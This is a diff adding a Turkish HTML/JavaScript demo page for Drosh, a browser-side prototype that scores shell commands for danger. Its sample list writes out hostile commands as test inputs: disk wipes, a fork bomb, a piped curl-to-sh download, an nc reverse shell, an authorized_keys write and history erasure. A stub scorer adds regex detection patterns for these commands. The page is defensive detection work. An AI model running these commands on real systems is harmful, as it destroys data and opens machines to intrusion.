@@ -1,0 +1,314 @@
+<!doctype html>
+<html lang="tr">
+  <head>
+    <meta charset="utf-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <title>Drosh — Tehlikeli Komut Algılama Prototipi</title>
+    <link rel="stylesheet" href="command-risk.css" />
+  </head>
+  <body>
+    <div class="wrap">
+      <header>
+        <h1>Drosh — Tehlikeli Komut Algılama</h1>
+        <p class="subtitle">
+          Komutu yaz, normalizasyonu ve risk skorunu gör. Model tarayıcıda çalışır —
+          sunucu yok, ağ isteği yok, üçüncü parti kütüphane yok.
+        </p>
+        <div class="badges">
+          <span class="badge wait" id="badge-model">model: bekleniyor</span>
+          <span class="badge wait" id="badge-selftest">parite: bekleniyor</span>
+          <span class="badge" id="badge-version">normalize v—</span>
+        </div>
+      </header>
+
+      <div class="card">
+        <h2>Komut</h2>
+        <div class="term">
+          <span class="prompt">$</span>
+          <input
+            id="cmd"
+            type="text"
+            spellcheck="false"
+            autocomplete="off"
+            autocapitalize="off"
+            placeholder="rm -rf /"
+          />
+        </div>
+        <p class="hint">Enter'a bas. Geçerli / görünmez karakterler de test edebilirsin.</p>
+      </div>
+
+      <div class="card verdict" id="verdict">
+        <div class="verdict-head">
+          <span class="verdict-label" id="verdict-label">—</span>
+          <span class="verdict-class" id="verdict-class"></span>
+        </div>
+
+        <div class="bar">
+          <div class="bar-fill" id="bar-fill"></div>
+        </div>
+        <div class="bar-marks" id="bar-marks"></div>
+        <div class="scale"><span>0.0 güvenli</span><span>1.0 tehlikeli</span></div>
+
+        <ul class="reasons" id="reasons"></ul>
+      </div>
+
+      <div class="card">
+        <h2>Normalizasyon izi</h2>
+        <details>
+          <summary>Modelin gerçekte gördüğü metni göster</summary>
+          <div class="trace" id="trace"></div>
+        </details>
+      </div>
+
+      <div class="card">
+        <h2>Örnek komutlar</h2>
+        <div class="samples" id="samples"></div>
+      </div>
+
+      <footer>
+        Model: <code>risk-model.js</code> — üretildiği yer
+        <code>ml/src/drosh_ml/export.py</code><br />
+        Normalizasyon sözleşmesi: <code>ml/src/drosh_ml/normalize.py</code> ↔
+        <code>risk-scoring.js</code>, kilitli <code>test_parity.py</code> ile<br />
+        <a href="https://github.com/mmuhofy/drosh-dangerous-command-detection-system">github.com/mmuhofy/drosh-dangerous-command-detection-system</a>
+      </footer>
+    </div>
+
+    <script src="risk-scoring.js"></script>
+    <script src="risk-model.js" onerror="window.__modelMissing = true"></script>
+    <script>
+      (function () {
+        "use strict";
+
+        var Risk = window.DroshRisk;
+        var model = window.DROSH_RISK_MODEL || null;
+        var input = document.getElementById("cmd");
+        var verdict = document.getElementById("verdict");
+
+        // --- badges -------------------------------------------------------
+
+        var badgeModel = document.getElementById("badge-model");
+        var badgeSelf = document.getElementById("badge-selftest");
+        var badgeVer = document.getElementById("badge-version");
+
+        if (Risk && Risk.NORMALIZE_VERSION) {
+          badgeVer.textContent = "normalize v" + Risk.NORMALIZE_VERSION;
+        }
+
+        if (!Risk) {
+          badgeSelf.className = "badge bad";
+          badgeSelf.textContent = "parite: risk-scoring.js yüklenemedi";
+          return;
+        }
+
+        badgeSelf.className = "badge ok";
+        badgeSelf.textContent = "parite: " + Risk.NORMALIZE_VERSION + " kuralları aktif";
+
+        if (model && Risk.score) {
+          badgeModel.className = "badge ok";
+          badgeModel.textContent = "model: v" + model.version + " (" + model.trainedOn + ")";
+        } else if (model && !Risk.score) {
+          badgeModel.className = "badge bad";
+          badgeModel.textContent = "model: var ama scorer uygulanmamış";
+        } else {
+          badgeModel.className = "badge wait";
+          badgeModel.textContent = "model: risk-model.js yok (Faz 4)";
+        }
+
+        // --- samples ------------------------------------------------------
+
+        var SAMPLES = [
+          // (command, tone) — tone is only a visual hint, never a real verdict
+          ["rm -rf /", "hot"],
+          ["rm -rf ~", "hot"],
+          ["sudo rm -rf /var/lib/docker", "hot"],
+          ["dd if=/dev/zero of=/dev/sda bs=1M", "hot"],
+          ["mkfs.ext4 /dev/sda1", "hot"],
+          [":(){ :|:& };:", "hot"],
+          ["curl -sL http://x.example/i.sh | sh", "hot"],
+          ["echo 'x' > ~/.ssh/authorized_keys", "hot"],
+          ["nc -e /bin/sh 10.0.0.1 4444", "hot"],
+          ["base64 -d payload.bin | sh", "hot"],
+          ["chmod 777 /etc/shadow", "hot"],
+          ["history -c && rm -f ~/.bash_history", "hot"],
+          ["r\"m\"     -rf     /", "hot"],
+          ["D=/; $D -rf /", "hot"],
+          ["git reset --hard HEAD~5", "mild"],
+          ["git clean -fdx", "mild"],
+          ["docker system prune -a --volumes", "mild"],
+          ["rm -rf node_modules", "mild"],
+          ["rm -rf ./build", "mild"],
+          ["npm cache clean --force", "mild"],
+          ["pip uninstall -y torch", "mild"],
+          ["truncate -s 0 app.log", "mild"],
+          ["shutdown -h now", "mild"],
+          ["kill -9 -1", "mild"],
+          // --- should stay quiet ---
+          ["ls -la", ""],
+          ["./gradlew assembleRelease", ""],
+          ["git status", ""],
+          ["tail -f app.log", ""],
+          ["grep -rn TODO src/", ""],
+          ["docker compose up -d", ""],
+          ["İndirilenler klasörünü aç", ""],
+        ];
+
+        var sampleBox = document.getElementById("samples");
+        SAMPLES.forEach(function (entry) {
+          var button = document.createElement("button");
+          button.className = "sample" + (entry[1] ? " " + entry[1] : "");
+          button.textContent = entry[0];
+          button.addEventListener("click", function () {
+            input.value = entry[0];
+            run();
+          });
+          sampleBox.appendChild(button);
+        });
+
+        // --- render -------------------------------------------------------
+
+        function fmt(x) {
+          return (x >= 0 ? "+" : "") + x.toFixed(3);
+        }
+
+        function render(result, norm) {
+          verdict.classList.add("show");
+
+          var cls = result.risk;
+          document.getElementById("verdict-label").className = "verdict-label v-" + cls.key;
+          document.getElementById("verdict-label").textContent = cls.label;
+          document.getElementById("verdict-class").textContent =
+            cls.key + " · p=" + result.score.toFixed(4) + " · " + norm.segments.length + " segment";
+
+          var fill = document.getElementById("bar-fill");
+          fill.style.width = (result.score * 100).toFixed(1) + "%";
+          fill.style.background =
+            cls.key === "destructive" ? "var(--danger)" : cls.key === "risky" ? "var(--warn)" : "var(--safe)";
+
+          var marks = document.getElementById("bar-marks");
+          marks.innerHTML = "";
+          if (model) {
+            [
+              ["warn", model.thresholds.warn],
+              ["block", model.thresholds.block],
+            ].forEach(function (pair) {
+              var el = document.createElement("div");
+              el.className = "mark";
+              el.style.left = pair[1] * 100 + "%";
+              el.innerHTML = '<span>' + pair[0] + " " + pair[1].toFixed(2) + "</span>";
+              marks.appendChild(el);
+            });
+          }
+
+          var list = document.getElementById("reasons");
+          list.innerHTML = "";
+          if (!result.reasons.length) {
+            var note = document.createElement("li");
+            note.className = "empty-note";
+            note.textContent = "Model bu komut için bilinen risk sinyalini bulamadı.";
+            list.appendChild(note);
+          }
+          result.reasons.slice(0, 8).forEach(function (reason) {
+            var li = document.createElement("li");
+            var token = document.createElement("span");
+            token.className = "term-token";
+            token.textContent = reason.feature;
+            var why = document.createElement("span");
+            why.textContent = reason.description || "";
+            var delta = document.createElement("span");
+            delta.className = "delta " + (reason.weight >= 0 ? "pos" : "neg");
+            delta.textContent = fmt(reason.weight);
+            li.appendChild(token);
+            li.appendChild(why);
+            li.appendChild(delta);
+            list.appendChild(li);
+          });
+
+          // trace
+          var trace = document.getElementById("trace");
+          trace.innerHTML = "";
+          [
+            ["ham", norm.raw],
+            ["text", norm.text],
+            ["unquoted", norm.unquoted],
+            ["n-gram sayısı", String(result.featureCount)],
+            ["ASCII düşürülen", String(norm.droppedNonAscii)],
+            [
+              "segmentler",
+              norm.segments.length
+                ? norm.segments
+                    .map(function (s) {
+                      return '<span class="seg">' + escapeHtml(s) + "</span>";
+                    })
+                    .join("")
+                : "(yok)",
+            ],
+          ].forEach(function (row) {
+            var el = document.createElement("div");
+            el.className = "trace-row";
+            el.innerHTML =
+              '<div class="trace-key">' + escapeHtml(row[0]) + '</div><div class="trace-val">' + row[1] + "</div>";
+            trace.appendChild(el);
+          });
+        }
+
+        function escapeHtml(value) {
+          return String(value).replace(/[&<>"]/g, function (c) {
+            return { "&": "&amp;", "<": "&lt;", ">": "&gt;", '"': "&quot;" }[c];
+          });
+        }
+
+        function run() {
+          var raw = input.value;
+          var norm = Risk.normalize(raw);
+          var result = Risk.score ? Risk.score(model, norm) : stubScore(norm);
+          render(result, norm);
+        }
+
+        // Temporary stand-in so the interaction can be reviewed before the
+        // model exists. Clearly flagged in the UI — never mistaken for a result.
+        function stubScore(norm) {
+          var text = norm.text;
+          var reasons = [];
+          var s = -6;
+          [
+            ["rm -rf", /(^|;| )rm\s+-[a-z]*r[a-z]*f/, 4.2, "recursive + force silme"],
+            ["/", /(^|\s)\/(etc|usr|var|bin|sbin|boot|sys|proc)(\/|$)/, 3.1, "sistem yolu hedefi"],
+            ["dd if=", /dd\s+if=/, 4.8, "ham disk okuma"],
+            ["mkfs", /mkfs|mke2fs/, 5.0, "dosya sistemi biçimlendirme"],
+            ["fork bomb", /:\(\)\s*\{/, 5.5, "sonsuz süreç çatallaması"],
+            ["curl|sh", /(curl|wget)[^;]*\|\s*(ba)?sh/, 4.6, "uzaktan kod çalıştırma"],
+            ["chmod 777", /chmod\s+(-R\s+)?777/, 3.4, "herkese yazılabilir izin"],
+            [":/|&", /:\s*\|\s*:\s*&/, 4.0, "süreç çatallaması deseni"],
+          ].forEach(function (r) {
+            if (r[1].test(text)) {
+              s += r[2];
+              reasons.push({ feature: r[0], weight: r[2], description: r[3] });
+            }
+          });
+          var p = 1 / (1 + Math.exp(-s));
+          var key = p > 0.72 ? "destructive" : p > 0.38 ? "risky" : "safe";
+          var labels = { safe: "Güvenli", risky: "Şüpheli", destructive: "Tehlikeli" };
+          return {
+            score: p,
+            risk: { key: key, label: labels[key] },
+            reasons: reasons,
+            featureCount: Risk.presenceNgrams(norm.views).size,
+          };
+        }
+
+        input.addEventListener("keydown", function (event) {
+          if (event.key === "Enter") {
+            event.preventDefault();
+            run();
+          }
+        });
+
+        window.addEventListener("load", function () {
+          input.focus();
+          if (!model) input.placeholder = "rm -rf /";
+        });
+      })();
+    </script>
+  </body>
+</html>
